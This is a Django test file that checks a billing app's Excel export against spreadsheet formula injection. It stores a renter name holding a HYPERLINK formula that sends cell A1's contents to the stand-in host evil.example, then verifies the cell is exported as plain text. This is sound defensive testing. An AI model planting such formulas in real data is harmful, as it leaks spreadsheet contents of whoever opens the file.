from io import BytesIO

from openpyxl import load_workbook

from apps.billing._tests_common import BASE, auth, contract_payload, make_reference, make_user
from apps.billing.services.excel_export import COL
from rest_framework.test import APITestCase

PAYLOAD_NAME = '=HYPERLINK("https://evil.example/?c="&A1,"Ochish")'


class BillingExportFormulaInjectionTest(APITestCase):
    """Audit B6: ijarachi nomi/manzili kabi matnlar eksportda formula bo'lib ketmasligi kerak."""

    def test_renter_name_is_exported_as_text_not_formula(self):
        ref = make_reference()
        admin = make_user("bsuper", "billing_super")
        payload = contract_payload(ref)
        payload["renter"]["full_name"] = PAYLOAD_NAME
        client = auth(self.client_class(), admin)
        self.assertEqual(client.post(f"{BASE}/contracts/", payload, format="json").status_code, 201)

        resp = client.get(f"{BASE}/contracts/export-excel/")
        self.assertEqual(resp.status_code, 200)
        ws = load_workbook(BytesIO(resp.content)).active
        cells = [c for row in ws.iter_rows(min_col=COL["full_name"], max_col=COL["full_name"]) for c in row
                 if c.value == PAYLOAD_NAME]
        self.assertEqual(len(cells), 1)
        self.assertEqual(cells[0].data_type, "s")
